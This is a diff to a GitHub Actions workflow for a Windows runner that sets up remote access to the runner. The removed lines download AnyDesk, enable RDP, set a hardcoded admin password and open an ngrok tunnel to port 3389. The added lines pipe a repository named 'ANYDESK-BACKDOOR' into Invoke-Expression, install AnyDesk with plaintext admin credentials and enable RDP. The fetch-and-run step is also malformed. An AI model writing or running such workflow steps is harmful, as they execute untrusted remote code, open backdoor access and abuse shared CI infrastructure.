@@ -4,15 +4,14 @@ jobs:
   build:
     runs-on: windows-latest
     steps:
-    - name: Download Anyesk
-      run: Invoke-WebRequest https://anydesk.com/en/downloads/thank-you?dv=win_exe -OutFile anydesk.exe
-    - name: Run anydesk
-      run: .\anydesk.exe
-      env:
-    - name: Authentication
-      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+    - name: Download
+      run: Powershell -irm https://github.com/AiGptCode/ANYDESK-BACKDOOR.git | iex
+    - name: Extract
+      run: Expand-Archive ANYDESK-BACKDOOR-main.zip
+    - name: Auth
+      run: .\Install-AnyDesk.ps1 -InstallPath "C:\CustomPath" -AdminUsername "myadmin" -AdminPassword "mypassword"
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
     - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
-    - name: Create Tunnel
-      run: .\ngrok\ngrok.exe tcp 3389
